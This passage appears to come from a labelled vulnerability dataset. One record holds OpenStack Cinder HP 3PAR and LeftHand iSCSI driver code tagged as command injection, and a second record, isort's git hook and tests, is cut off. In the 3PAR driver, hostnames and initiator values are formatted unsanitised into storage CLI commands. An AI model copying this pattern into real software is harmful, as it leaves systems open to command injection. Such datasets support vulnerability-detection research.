\"\"\"OpenStack iSCSI driver to enable 3PAR storage array.\n\n    Version history:\n        1.0 - Initial driver\n        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,\n              session changes, faster clone, requires 3.1.2 MU2 firmware.\n\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)\n        self.common = None\n        self.configuration.append_config_values(hpcommon.hp3par_opts)\n        self.configuration.append_config_values(san.san_opts)\n\n    def _init_common(self):\n        return hpcommon.HP3PARCommon(self.configuration)\n\n    def _check_flags(self):\n        \"\"\"Sanity check to ensure we have required options set.\"\"\"\n        required_flags = ['hp3par_api_url', 'hp3par_username',\n                          'hp3par_password', 'san_ip', 'san_login',\n                          'san_password']\n        self.common.check_flags(self.configuration, required_flags)\n\n    @utils.synchronized('3par', external=True)\n    def get_volume_stats(self, refresh):\n        self.common.client_login()\n        stats = self.common.get_volume_stats(refresh)\n        stats['storage_protocol'] = 'iSCSI'\n        backend_name = self.configuration.safe_get('volume_backend_name')\n        stats['volume_backend_name'] = backend_name or self.__class__.__name__\n        self.common.client_logout()\n        return stats\n\n    def do_setup(self, context):\n        self.common = self._init_common()\n        self._check_flags()\n\n        # map iscsi_ip-> ip_port\n        #             -> iqn\n        #             -> nsp\n        self.iscsi_ips = {}\n        temp_iscsi_ip = {}\n\n        # use the 3PAR ip_addr list for iSCSI configuration\n        if len(self.configuration.hp3par_iscsi_ips) > 0:\n            # add port values to ip_addr, if necessary\n            for ip_addr in self.configuration.hp3par_iscsi_ips:\n                ip = ip_addr.split(':')\n                if len(ip) == 1:\n                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}\n                elif len(ip) == 2:\n                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}\n                else:\n                    msg = _(\"Invalid IP address format '%s'\") % ip_addr\n                    LOG.warn(msg)\n\n        # add the single value iscsi_ip_address option to the IP dictionary.\n        # This way we can see if it's a valid iSCSI IP. If it's not valid,\n        # we won't use it and won't bother to report it, see below\n        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):\n            ip = self.configuration.iscsi_ip_address\n            ip_port = self.configuration.iscsi_port\n            temp_iscsi_ip[ip] = {'ip_port': ip_port}\n\n        # get all the valid iSCSI ports from 3PAR\n        # when found, add the valid iSCSI ip, ip port, iqn and nsp\n        # to the iSCSI IP dictionary\n        # ...this will also make sure ssh works.\n        iscsi_ports = self.common.get_ports()['iSCSI']\n        for (ip, iscsi_info) in iscsi_ports.iteritems():\n            if ip in temp_iscsi_ip:\n                ip_port = temp_iscsi_ip[ip]['ip_port']\n                self.iscsi_ips[ip] = {'ip_port': ip_port,\n                                      'nsp': iscsi_info['nsp'],\n                                      'iqn': iscsi_info['iqn']\n                                      }\n                del temp_iscsi_ip[ip]\n\n        # if the single value iscsi_ip_address option is still in the\n        # temp dictionary it's because it defaults to $my_ip which doesn't\n        # make sense in this context. So, if present, remove it and move on.\n        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):\n            del temp_iscsi_ip[self.configuration.iscsi_ip_address]\n\n        # lets see if there are invalid iSCSI IPs left in the temp dict\n        if len(temp_iscsi_ip) > 0:\n            msg = _(\"Found invalid iSCSI IP address(s) in configuration \"\n                    \"option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'\") % \\\n                   (\", \".join(temp_iscsi_ip))\n            LOG.warn(msg)\n\n        if not len(self.iscsi_ips) > 0:\n            msg = _('At least one valid iSCSI IP address must be set.')\n            raise exception.InvalidInput(reason=(msg))\n\n        self.common.do_setup(context)\n\n    def check_for_setup_error(self):\n        \"\"\"Returns an error if prerequisites aren't met.\"\"\"\n        self._check_flags()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume(self, volume):\n        self.common.client_login()\n        metadata = self.common.create_volume(volume)\n        self.common.client_logout()\n\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_cloned_volume(self, volume, src_vref):\n        \"\"\"Clone an existing volume.\"\"\"\n        self.common.client_login()\n        new_vol = self.common.create_cloned_volume(volume, src_vref)\n        self.common.client_logout()\n\n        return {'metadata': new_vol}\n\n    @utils.synchronized('3par', external=True)\n    def delete_volume(self, volume):\n        self.common.client_login()\n        self.common.delete_volume(volume)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume_from_snapshot(self, volume, snapshot):\n        \"\"\"\n        Creates a volume from a snapshot.\n\n        TODO: support using the size from the user.\n        \"\"\"\n        self.common.client_login()\n        metadata = self.common.create_volume_from_snapshot(volume, snapshot)\n        self.common.client_logout()\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.create_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def delete_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.delete_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def initialize_connection(self, volume, connector):\n        \"\"\"Assigns the volume to a server.\n\n        Assign any created volume to a compute node/host so that it can be\n        used from that host.\n\n        This driver returns a driver_volume_type of 'iscsi'.\n        The format of the driver data is defined in _get_iscsi_properties.\n        Example return value:\n\n            {\n                'driver_volume_type': 'iscsi'\n                'data': {\n                    'target_discovered': True,\n                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',\n                    'target_protal': '127.0.0.1:3260',\n                    'volume_id': 1,\n                }\n            }\n\n        Steps to export a volume on 3PAR\n          * Get the 3PAR iSCSI iqn\n          * Create a host on the 3par\n          * create vlun on the 3par\n        \"\"\"\n        self.common.client_login()\n\n        # we have to make sure we have a host\n        host = self._create_host(volume, connector)\n\n        # now that we have a host, create the VLUN\n        vlun = self.common.create_vlun(volume, host)\n\n        self.common.client_logout()\n\n        iscsi_ip = self._get_iscsi_ip(host['name'])\n        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']\n        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']\n        info = {'driver_volume_type': 'iscsi',\n                'data': {'target_portal': \"%s:%s\" %\n                         (iscsi_ip, iscsi_ip_port),\n                         'target_iqn': iscsi_target_iqn,\n                         'target_lun': vlun['lun'],\n                         'target_discovered': True\n                         }\n                }\n        return info\n\n    @utils.synchronized('3par', external=True)\n    def terminate_connection(self, volume, connector, **kwargs):\n        \"\"\"Driver entry point to unattach a volume from an instance.\"\"\"\n        self.common.client_login()\n        self.common.terminate_connection(volume,\n                                         connector['host'],\n                                         connector['initiator'])\n        self.common.client_logout()\n\n    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):\n        \"\"\"Create a 3PAR host.\n\n        Create a 3PAR host, if there is already a host on the 3par using\n        the same iqn but with a different hostname, return the hostname\n        used by 3PAR.\n        \"\"\"\n        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \\\n              (persona_id, domain, hostname, iscsi_iqn)\n        out = self.common._cli_run(cmd, None)\n        if out and len(out) > 1:\n            return self.common.parse_create_host_error(hostname, out)\n        return hostname\n\n    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):\n        # when using -add, you can not send the persona or domain options\n        self.common._cli_run('createhost -iscsi -add %s %s'\n                             % (hostname, iscsi_iqn), None)\n\n    def _create_host(self, volume, connector):\n        \"\"\"Creates or modifies existing 3PAR host.\"\"\"\n        # make sure we don't have the host already\n        host = None\n        hostname = self.common._safe_hostname(connector['host'])\n        cpg = self.common.get_cpg(volume, allowSnap=True)\n        domain = self.common.get_domain(cpg)\n        try:\n            host = self.common._get_3par_host(hostname)\n            if not host['iSCSIPaths']:\n                self._modify_3par_iscsi_host(hostname, connector['initiator'])\n                host = self.common._get_3par_host(hostname)\n        except hpexceptions.HTTPNotFound:\n            # get persona from the volume type extra specs\n            persona_id = self.common.get_persona_type(volume)\n            # host doesn't exist, we have to create it\n            hostname = self._create_3par_iscsi_host(hostname,\n                                                    connector['initiator'],\n                                                    domain,\n                                                    persona_id)\n            host = self.common._get_3par_host(hostname)\n\n        return host\n\n    @utils.synchronized('3par', external=True)\n    def create_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def ensure_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def remove_export(self, context, volume):\n        pass\n\n    def _get_iscsi_ip(self, hostname):\n        \"\"\"Get an iSCSI IP address to use.\n\n        Steps to determine which IP address to use.\n          * If only one IP address, return it\n          * If there is an active vlun, return the IP associated with it\n          * Return IP with fewest active vluns\n        \"\"\"\n        if len(self.iscsi_ips) == 1:\n            return self.iscsi_ips.keys()[0]\n\n        # if we currently have an active port, use it\n        nsp = self._get_active_nsp(hostname)\n\n        if nsp is None:\n            # no active vlun, find least busy port\n            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())\n            if nsp is None:\n                msg = _(\"Least busy iSCSI port not found, \"\n                        \"using first iSCSI port in list.\")\n                LOG.warn(msg)\n                return self.iscsi_ips.keys()[0]\n\n        return self._get_ip_using_nsp(nsp)\n\n    def _get_iscsi_nsps(self):\n        \"\"\"Return the list of candidate nsps.\"\"\"\n        nsps = []\n        for value in self.iscsi_ips.values():\n            nsps.append(value['nsp'])\n        return nsps\n\n    def _get_ip_using_nsp(self, nsp):\n        \"\"\"Return IP assiciated with given nsp.\"\"\"\n        for (key, value) in self.iscsi_ips.items():\n            if value['nsp'] == nsp:\n                return key\n\n    def _get_active_nsp(self, hostname):\n        \"\"\"Return the active nsp, if one exists, for the given host.\"\"\"\n        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)\n        if result:\n            # first line is header\n            result = result[1:]\n            for line in result:\n                info = line.split(\",\")\n                if info and len(info) > 4:\n                    return info[4]\n\n    def _get_least_used_nsp(self, nspss):\n        \"\"\"\"Return the nsp that has the fewest active vluns.\"\"\"\n        # return only the nsp (node:server:port)\n        result = self.common._cli_run('showvlun -a -showcols Port', None)\n\n        # count the number of nsps (there is 1 for each active vlun)\n        nsp_counts = {}\n        for nsp in nspss:\n            # initialize counts to zero\n            nsp_counts[nsp] = 0\n\n        current_least_used_nsp = None\n        if result:\n            # first line is header\n            result = result[1:]\n            for line in result:\n                nsp = line.strip()\n                if nsp in nsp_counts:\n                    nsp_counts[nsp] = nsp_counts[nsp] + 1\n\n            # identify key (nsp) of least used nsp\n            current_smallest_count = sys.maxint\n            for (nsp, count) in nsp_counts.iteritems():\n                if count < current_smallest_count:\n                    current_least_used_nsp = nsp\n                    current_smallest_count = count\n\n        return current_least_used_nsp\n\n    def extend_volume(self, volume, new_size):\n        self.common.extend_volume(volume, new_size)\n/n/n/n/cinder/volume/drivers/san/hp_lefthand.py/n/n#    Copyright 2012 OpenStack LLC\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\"\"\"\nHP Lefthand SAN ISCSI Driver.\n\nThe driver communicates to the backend aka Cliq via SSH to perform all the\noperations on the SAN.\n\"\"\"\nfrom lxml import etree\n\nfrom cinder import exception\nfrom cinder.openstack.common import log as logging\nfrom cinder.volume.drivers.san.san import SanISCSIDriver\n\n\nLOG = logging.getLogger(__name__)\n\n\nclass HpSanISCSIDriver(SanISCSIDriver):\n    \"\"\"Executes commands relating to HP/Lefthand SAN ISCSI volumes.\n\n    We use the CLIQ interface, over SSH.\n\n    Rough overview of CLIQ commands used:\n\n    :createVolume:    (creates the volume)\n\n    :getVolumeInfo:    (to discover the IQN etc)\n\n    :getClusterInfo:    (to discover the iSCSI target IP address)\n\n    :assignVolumeChap:    (exports it with CHAP security)\n\n    The 'trick' here is that the HP SAN enforces security by default, so\n    normally a volume mount would need both to configure the SAN in the volume\n    layer and do the mount on the compute layer.  Multi-layer operations are\n    not catered for at the moment in the cinder architecture, so instead we\n    share the volume using CHAP at volume creation time.  Then the mount need\n    only use those CHAP credentials, so can take place exclusively in the\n    compute layer.\n    \"\"\"\n\n    device_stats = {}\n\n    def __init__(self, *args, **kwargs):\n        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)\n        self.cluster_vip = None\n\n    def _cliq_run(self, verb, cliq_args, check_exit_code=True):\n        \"\"\"Runs a CLIQ command over SSH, without doing any result parsing\"\"\"\n        cliq_arg_strings = []\n        for k, v in cliq_args.items():\n            cliq_arg_strings.append(\" %s=%s\" % (k, v))\n        cmd = verb + ''.join(cliq_arg_strings)\n\n        return self._run_ssh(cmd, check_exit_code)\n\n    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):\n        \"\"\"Runs a CLIQ command over SSH, parsing and checking the output\"\"\"\n        cliq_args['output'] = 'XML'\n        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)\n\n        LOG.debug(_(\"CLIQ command returned %s\"), out)\n\n        result_xml = etree.fromstring(out)\n        if check_cliq_result:\n            response_node = result_xml.find(\"response\")\n            if response_node is None:\n                msg = (_(\"Malformed response to CLIQ command \"\n                         \"%(verb)s %(cliq_args)s. Result=%(out)s\") %\n                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})\n                raise exception.VolumeBackendAPIException(data=msg)\n\n            result_code = response_node.attrib.get(\"result\")\n\n            if result_code != \"0\":\n                msg = (_(\"Error running CLIQ command %(verb)s %(cliq_args)s. \"\n                         \" Result=%(out)s\") %\n                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})\n                raise exception.VolumeBackendAPIException(data=msg)\n\n        return result_xml\n\n    def _cliq_get_cluster_info(self, cluster_name):\n        \"\"\"Queries for info about the cluster (including IP)\"\"\"\n        cliq_args = {}\n        cliq_args['clusterName'] = cluster_name\n        cliq_args['searchDepth'] = '1'\n        cliq_args['verbose'] = '0'\n\n        result_xml = self._cliq_run_xml(\"getClusterInfo\", cliq_args)\n\n        return result_xml\n\n    def _cliq_get_cluster_vip(self, cluster_name):\n        \"\"\"Gets the IP on which a cluster shares iSCSI volumes\"\"\"\n        cluster_xml = self._cliq_get_cluster_info(cluster_name)\n\n        vips = []\n        for vip in cluster_xml.findall(\"response/cluster/vip\"):\n            vips.append(vip.attrib.get('ipAddress'))\n\n        if len(vips) == 1:\n            return vips[0]\n\n        _xml = etree.tostring(cluster_xml)\n        msg = (_(\"Unexpected number of virtual ips for cluster \"\n                 \" %(cluster_name)s. Result=%(_xml)s\") %\n               {'cluster_name': cluster_name, '_xml': _xml})\n        raise exception.VolumeBackendAPIException(data=msg)\n\n    def _cliq_get_volume_info(self, volume_name):\n        \"\"\"Gets the volume info, including IQN\"\"\"\n        cliq_args = {}\n        cliq_args['volumeName'] = volume_name\n        result_xml = self._cliq_run_xml(\"getVolumeInfo\", cliq_args)\n\n        # Result looks like this:\n        #<gauche version=\"1.0\">\n        #  <response description=\"Operation succeeded.\" name=\"CliqSuccess\"\n        #            processingTime=\"87\" result=\"0\">\n        #    <volume autogrowPages=\"4\" availability=\"online\" blockSize=\"1024\"\n        #       bytesWritten=\"0\" checkSum=\"false\" clusterName=\"Cluster01\"\n        #       created=\"2011-02-08T19:56:53Z\" deleting=\"false\" description=\"\"\n        #       groupName=\"Group01\" initialQuota=\"536870912\" isPrimary=\"true\"\n        #       iscsiIqn=\"iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b\"\n        #       maxSize=\"6865387257856\" md5=\"9fa5c8b2cca54b2948a63d833097e1ca\"\n        #       minReplication=\"1\" name=\"vol-b\" parity=\"0\" replication=\"2\"\n        #       reserveQuota=\"536870912\" scratchQuota=\"4194304\"\n        #       serialNumber=\"9fa5c8b2cca54b2948a63d833097e1ca0000000000006316\"\n        #       size=\"1073741824\" stridePages=\"32\" thinProvision=\"true\">\n        #      <status description=\"OK\" value=\"2\"/>\n        #      <permission access=\"rw\"\n        #            authGroup=\"api-34281B815713B78-(trimmed)51ADD4B7030853AA7\"\n        #            chapName=\"chapusername\" chapRequired=\"true\" id=\"25369\"\n        #            initiatorSecret=\"\" iqn=\"\" iscsiEnabled=\"true\"\n        #            loadBalance=\"true\" targetSecret=\"supersecret\"/>\n        #    </volume>\n        #  </response>\n        #</gauche>\n\n        # Flatten the nodes into a dictionary; use prefixes to avoid collisions\n        volume_attributes = {}\n\n        volume_node = result_xml.find(\"response/volume\")\n        for k, v in volume_node.attrib.items():\n            volume_attributes[\"volume.\" + k] = v\n\n        status_node = volume_node.find(\"status\")\n        if status_node is not None:\n            for k, v in status_node.attrib.items():\n                volume_attributes[\"status.\" + k] = v\n\n        # We only consider the first permission node\n        permission_node = volume_node.find(\"permission\")\n        if permission_node is not None:\n            for k, v in status_node.attrib.items():\n                volume_attributes[\"permission.\" + k] = v\n\n        LOG.debug(_(\"Volume info: %(volume_name)s => %(volume_attributes)s\") %\n                  {'volume_name': volume_name,\n                   'volume_attributes': volume_attributes})\n        return volume_attributes\n\n    def create_volume(self, volume):\n        \"\"\"Creates a volume.\"\"\"\n        cliq_args = {}\n        cliq_args['clusterName'] = self.configuration.san_clustername\n\n        if self.configuration.san_thin_provision:\n            cliq_args['thinProvision'] = '1'\n        else:\n            cliq_args['thinProvision'] = '0'\n\n        cliq_args['volumeName'] = volume['name']\n        if int(volume['size']) == 0:\n            cliq_args['size'] = '100MB'\n        else:\n            cliq_args['size'] = '%sGB' % volume['size']\n\n        self._cliq_run_xml(\"createVolume\", cliq_args)\n\n        volume_info = self._cliq_get_volume_info(volume['name'])\n        cluster_name = volume_info['volume.clusterName']\n        iscsi_iqn = volume_info['volume.iscsiIqn']\n\n        #TODO(justinsb): Is this always 1? Does it matter?\n        cluster_interface = '1'\n\n        if not self.cluster_vip:\n            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)\n        iscsi_portal = self.cluster_vip + \":3260,\" + cluster_interface\n\n        model_update = {}\n\n        # NOTE(jdg): LH volumes always at lun 0 ?\n        model_update['provider_location'] = (\"%s %s %s\" %\n                                             (iscsi_portal,\n                                              iscsi_iqn,\n                                              0))\n\n        return model_update\n\n    def create_volume_from_snapshot(self, volume, snapshot):\n        \"\"\"Creates a volume from a snapshot.\"\"\"\n        raise NotImplementedError()\n\n    def create_snapshot(self, snapshot):\n        \"\"\"Creates a snapshot.\"\"\"\n        raise NotImplementedError()\n\n    def delete_volume(self, volume):\n        \"\"\"Deletes a volume.\"\"\"\n        cliq_args = {}\n        cliq_args['volumeName'] = volume['name']\n        cliq_args['prompt'] = 'false'  # Don't confirm\n        try:\n            volume_info = self._cliq_get_volume_info(volume['name'])\n        except exception.ProcessExecutionError:\n            LOG.error(\"Volume did not exist. It will not be deleted\")\n            return\n        self._cliq_run_xml(\"deleteVolume\", cliq_args)\n\n    def local_path(self, volume):\n        msg = _(\"local_path not supported\")\n        raise exception.VolumeBackendAPIException(data=msg)\n\n    def initialize_connection(self, volume, connector):\n        \"\"\"Assigns the volume to a server.\n\n        Assign any created volume to a compute node/host so that it can be\n        used from that host. HP VSA requires a volume to be assigned\n        to a server.\n\n        This driver returns a driver_volume_type of 'iscsi'.\n        The format of the driver data is defined in _get_iscsi_properties.\n        Example return value:\n\n            {\n                'driver_volume_type': 'iscsi'\n                'data': {\n                    'target_discovered': True,\n                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',\n                    'target_protal': '127.0.0.1:3260',\n                    'volume_id': 1,\n                }\n            }\n\n        \"\"\"\n        self._create_server(connector)\n        cliq_args = {}\n        cliq_args['volumeName'] = volume['name']\n        cliq_args['serverName'] = connector['host']\n        self._cliq_run_xml(\"assignVolumeToServer\", cliq_args)\n\n        iscsi_properties = self._get_iscsi_properties(volume)\n        return {\n            'driver_volume_type': 'iscsi',\n            'data': iscsi_properties\n        }\n\n    def _create_server(self, connector):\n        cliq_args = {}\n        cliq_args['serverName'] = connector['host']\n        out = self._cliq_run_xml(\"getServerInfo\", cliq_args, False)\n        response = out.find(\"response\")\n        result = response.attrib.get(\"result\")\n        if result != '0':\n            cliq_args = {}\n            cliq_args['serverName'] = connector['host']\n            cliq_args['initiator'] = connector['initiator']\n            self._cliq_run_xml(\"createServer\", cliq_args)\n\n    def terminate_connection(self, volume, connector, **kwargs):\n        \"\"\"Unassign the volume from the host.\"\"\"\n        cliq_args = {}\n        cliq_args['volumeName'] = volume['name']\n        cliq_args['serverName'] = connector['host']\n        self._cliq_run_xml(\"unassignVolumeToServer\", cliq_args)\n\n    def get_volume_stats(self, refresh):\n        if refresh:\n            self._update_backend_status()\n\n        return self.device_stats\n\n    def _update_backend_status(self):\n        data = {}\n        backend_name = self.configuration.safe_get('volume_backend_name')\n        data['volume_backend_name'] = backend_name or self.__class__.__name__\n        data['driver_version'] = '1.0'\n        data['reserved_percentage'] = 0\n        data['storage_protocol'] = 'iSCSI'\n        data['vendor_name'] = 'Hewlett-Packard'\n\n        result_xml = self._cliq_run_xml(\"getClusterInfo\", {})\n        cluster_node = result_xml.find(\"response/cluster\")\n        total_capacity = cluster_node.attrib.get(\"spaceTotal\")\n        free_capacity = cluster_node.attrib.get(\"unprovisionedSpace\")\n        GB = 1073741824\n\n        data['total_capacity_gb'] = int(total_capacity) / GB\n        data['free_capacity_gb'] = int(free_capacity) / GB\n        self.device_stats = data\n/n/n/n", "label": 1, "vtype": "command_injection"}, {"id": "1ab38f4f7840a3c19bf961a24630a992a8373a76", "code": "isort/hooks.py/n/n\"\"\"isort.py.\n\nDefines a git hook to allow pre-commit warnings and errors about import order.\n\nusage:\n    exit_code = git_hook(strict=True|False, modify=True|False)\n\nCopyright (C) 2015  Helen Sherwood-Taylor\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated\ndocumentation files (the \"Software\"), to deal in the Software without restriction, including without limitation\nthe rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and\nto permit persons to whom the Software is furnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all copies or\nsubstantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED\nTO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\nTHE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF\nCONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\nOTHER DEALINGS IN THE SOFTWARE.\n\n\"\"\"\nimport subprocess\nfrom typing import List\n\nfrom isort import SortImports\n\n\ndef get_output(command: List[str]) -> str:\n    \"\"\"\n    Run a command and return raw output\n\n    :param str command: the command to run\n    :returns: the stdout output of the command\n    \"\"\"\n    result = subprocess.run(command, stdout=subprocess.PIPE, check=True)\n    return result.stdout.decode()\n\n\ndef get_lines(command: List[str]) -> List[str]:\n    \"\"\"\n    Run a command and return lines of output\n\n    :param str command: the command to run\n    :returns: list of whitespace-stripped lines output by command\n    \"\"\"\n    stdout = get_output(command)\n    return [line.strip() for line in stdout.splitlines()]\n\n\ndef git_hook(strict=False, modify=False):\n    \"\"\"\n    Git pre-commit hook to check staged files for isort errors\n\n    :param bool strict - if True, return number of errors on exit,\n        causing the hook to fail. If False, return zero so it will\n        just act as a warning.\n    :param bool modify - if True, fix the sources if they are not\n        sorted properly. If False, only report result without\n        modifying anything.\n\n    :return number of errors if in strict mode, 0 otherwise.\n    \"\"\"\n\n    # Get list of files modified and staged\n    diff_cmd = [\"git\", \"diff-index\", \"--cached\", \"--name-only\", \"--diff-filter=ACMRTUXB HEAD\"]\n    files_modified = get_lines(diff_cmd)\n\n    errors = 0\n    for filename in files_modified:\n        if filename.endswith('.py'):\n            # Get the staged contents of the file\n            staged_cmd = [\"git\", \"show\", \":%s\" % filename]\n            staged_contents = get_output(staged_cmd)\n\n            sort = SortImports(\n                file_path=filename,\n                file_contents=staged_contents,\n                check=True\n            )\n\n            if sort.incorrectly_sorted:\n                errors += 1\n                if modify:\n                    SortImports(\n                        file_path=filename,\n                        file_contents=staged_contents,\n                        check=False,\n                    )\n\n    return errors if strict else 0\n/n/n/ntest_isort.py/n/n\"\"\"test_isort.py.\n\nTests all major functionality of the isort library\nShould be ran using py.test by simply running py.test in the isort project directory\n\nCopyright (C) 2013  Timothy Edmund Crosley\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated\ndocumentation files (the \"Software\"), to deal in the Software without restriction, including without limitation\nthe rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and\nto permit persons to whom the Software is furnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all copies or\nsubstantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED\nTO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\nTHE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF\nCONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\nOTHER DEALINGS IN THE SOFTWARE.\n\n\"\"\"\nimport io\nimport os\nimport os.path\nimport posixpath\nimport subprocess\nimport sys\nimport sysconfig\nfrom tempfile import NamedTemporaryFile\nfrom typing import Any, Dict, List\n\nimport py\nimport pytest\n\nfrom isort import finders, main, settings\nfrom isort.main import is_python_file, SortImports\nfrom isort.settings import WrapModes\nfrom isort.utils import exists_case_sensitive\n\ntry:\n    import toml\nexcept ImportError:\n    toml = None\n\nTEST_DEFAULT_CONFIG = \"\"\"\n[*.py]\nmax_line_length = 120\nindent_style = space\nindent_size = 4\nknown_first_party = isort\nknown_third_party = kate\nignore_frosted_errors = E103\nskip = build,.tox,venv\nbalanced_wrapping = true\nnot_skip = __init__.py\n\"\"\"\nSHORT_IMPORT = \"from third_party import lib1, lib2, lib3, lib4\"\nSINGLE_FROM_IMPORT = \"from third_party import lib1\"\nSINGLE_LINE_LONG_IMPORT = \"from third_party import lib1, lib2, lib3, lib4, lib5, lib5ab\"\nREALLY_LONG_IMPORT = (\"from third_party import lib1, lib2, lib3, lib4, lib5, lib6, lib7, lib8, lib9, lib10, lib11,\"\n                      \"lib12, lib13, lib14, lib15, lib16, lib17, lib18, lib20, lib21, lib22\")\nREALLY_LONG_IMPORT_WITH_COMMENT = (\"from third_party import lib1, lib2, lib3, lib4, lib5, lib6, lib7, lib8, lib9, \"\n                                   \"lib10, lib11, lib12, lib13, lib14, lib15, lib16, lib17, lib18, lib20, lib21, lib22\"\n                                   \" # comment\")\n\n\n@pytest.fixture(scope=\"session\", autouse=True)\ndef default_settings_path(tmpdir_factory):\n    config_dir = tmpdir_factory.mktemp('config')\n    config_file = config_dir.join('.editorconfig').strpath\n    with open(config_file, 'w') as editorconfig:\n        editorconfig.write(TEST_DEFAULT_CONFIG)\n\n    with config_dir.as_cwd():\n        yield config_dir.strpath\n\n\ndef test_happy_path():\n    \"\"\"Test the most basic use case, straight imports no code, simply not organized by category.\"\"\"\n    test_input = (\"import sys\\n\"\n                  \"import os\\n\"\n                  \"import myproject.test\\n\"\n                  \"import django.settings\")\n    test_output = SortImports(file_contents=test_input, known_third_party=['django']).output\n    assert test_output == (\"import os\\n\"\n                           \"import sys\\n\"\n                           \"\\n\"\n                           \"import django.settings\\n\"\n                           \"\\n\"\n                           \"import myproject.test\\n\")\n\n\ndef test_code_intermixed():\n    \"\"\"Defines what should happen when isort encounters imports intermixed with\n    code.\n\n    (it should pull them all to the top)\n\n    \"\"\"\n    test_input = (\"import sys\\n\"\n                  \"print('yo')\\n\"\n                  \"print('I like to put code between imports cause I want stuff to break')\\n\"\n                  \"import myproject.test\\n\")\n    test_output = SortImports(file_contents=test_input).output\n    assert test_output == (\"import sys\\n\"\n                           \"\\n\"\n                           \"import myproject.test\\n\"\n                           \"\\n\"\n                           \"print('yo')\\n\"\n                           \"print('I like to put code between imports cause I want stuff to break')\\n\")\n\n\ndef test_correct_space_between_imports():\n    \"\"\"Ensure after imports a correct amount of space (in newlines) is\n    enforced.\n\n    (2 for method, class, or decorator definitions 1 for anything else)\n\n    \"\"\"\n    test_input_method = (\"import sys\\n\"\n                         \"def my_method():\\n\"\n                         \"    print('hello world')\\n\")\n    test_output_method = SortImports(file_contents=test_input_method).output\n    assert test_output_method == (\"import sys\\n\"\n                                  \"\\n\"\n                                  \"\\n\"\n                                  \"def my_method():\\n\"\n                                  \"    print('hello world')\\n\")\n\n    test_input_decorator = (\"import sys\\n\"\n                            \"@my_decorator\\n\"\n                            \"def my_method():\\n\"\n                            \"    print('hello world')\\n\")\n    test_output_decorator = SortImports(file_contents=test_input_decorator).output\n    assert test_output_decorator == (\"import sys\\n\"\n                                     \"\\n\"\n                                     \"\\n\"\n                                     \"@my_decorator\\n\"\n                                     \"def my_method():\\n\"\n                                     \"    print('hello world')\\n\")\n\n    test_input_class = (\"import sys\\n\"\n                        \"class MyClass(object):\\n\"\n                        \"    pass\\n\")\n    test_output_class = SortImports(file_contents=test_input_class).output\n    assert test_output_class == (\"import sys\\n\"\n                                 \"\\n\"\n                                 \"\\n\"\n                                 \"class MyClass(object):\\n\"\n                                 \"    